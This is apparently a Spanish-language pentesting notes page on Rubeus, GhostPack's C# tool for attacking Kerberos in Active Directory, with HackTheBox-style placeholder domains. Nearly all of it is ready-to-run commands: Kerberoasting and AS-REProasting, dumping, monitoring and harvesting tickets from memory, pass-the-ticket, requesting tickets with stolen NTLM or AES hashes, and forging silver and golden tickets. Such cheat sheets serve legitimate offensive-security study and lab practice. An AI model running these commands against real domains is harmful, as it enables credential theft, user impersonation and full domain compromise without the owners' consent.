---
title: Rubeus
resumen: Herramienta ofensiva en C# de GhostPack para abusar del protocolo Kerberos en AD, más modular que mimikatz.
tags: swiss-army-knife
---

Herramienta ofensiva de código abierto escrita en C# para la interacción y abuso del protocolo Kerberos en entornos AD. Desarrollada por **GhostPack** (mismo equipo que Seatbelt, SharpUp...), es el equivalente moderno a los módulos Kerberos de mimikatz, pero más modular y orientada específicamente a ataques Kerberos.

### Kerberoasting / AS-REProasting

```powershell
# Kerberoasting con contraseña
./Rubeus.exe kerberoast /user:usuario /password:contraseña /domain:dominio.htb /nowrap /outfile:kerberoasting.txt

# Kerberoasting con hash NTLM
./Rubeus.exe kerberoast /user:usuario /rc4:HASH_NTLM /domain:dominio.htb /nowrap /outfile:kerberoasting.txt

# AS-REProasting sin credenciales, solo usuario vulnerable
./Rubeus.exe asreproast /user:usuario /domain:dominio.htb /nowrap
```

### Tickets

```powershell
# Pass-the-Ticket: importar ticket .kirbi
./Rubeus.exe ptt /ticket:ticket.kirbi

# Listar / purgar tickets en sesión
./Rubeus.exe klist
./Rubeus.exe purge

# Solicitar fake delegation TGT
./Rubeus.exe tgtdeleg /nowrap /outfile:ticket.kirbi
# /nowrap: muestra el Base64 en una sola línea en vez de partirlo en bloques de 80 caracteres

# Robo de tickets: volcar todos, monitorizar nuevos, o recoger continuamente
./Rubeus.exe dump /nowrap
./Rubeus.exe monitor /interval:5 /nowrap
./Rubeus.exe harvest /interval:30 /nowrap
```

### Solicitar TGT / TGS

```powershell
# TGT con contraseña / hash NTLM / AES256 (más sigiloso)
./Rubeus.exe asktgt /user:usuario /password:contraseña /domain:dominio.htb /nowrap
./Rubeus.exe asktgt /user:usuario /rc4:HASH_NTLM /domain:dominio.htb /nowrap
./Rubeus.exe asktgt /user:usuario /aes256:HASH_AES /domain:dominio.htb /nowrap /opsec

# TGS con el TGT ya en sesión, o con ticket explícito
./Rubeus.exe asktgs /service:cifs/DC01.dominio.htb /nowrap
./Rubeus.exe asktgs /ticket:ticket.kirbi /service:cifs/DC01.dominio.htb /nowrap
```

### Silver / Golden Ticket

```powershell
# Silver: requiere hash NTLM de la cuenta de servicio, SID del dominio y SPN objetivo
./Rubeus.exe silver /rc4:HASH_NTLM_SERVICIO /domain:dominio.htb /sid:S-1-5-21-XXXX /user:Administrator /service:cifs/DC01.dominio.htb /ptt

# Golden: requiere hash de krbtgt, SID del dominio y usuario a suplantar
./Rubeus.exe golden /rc4:HASH_KRBTGT /domain:dominio.htb /sid:S-1-5-21-XXXX /user:Administrator /nowrap
./Rubeus.exe golden /aes256:HASH_AES_KRBTGT /domain:dominio.htb /sid:S-1-5-21-XXXX /user:Administrator /nowrap
```

### Técnicas donde aparece

[[kerberoasting]] · [[asreproasting]] · [[pass-the-ticket]] · [[golden-ticket]] · [[silver-ticket]]
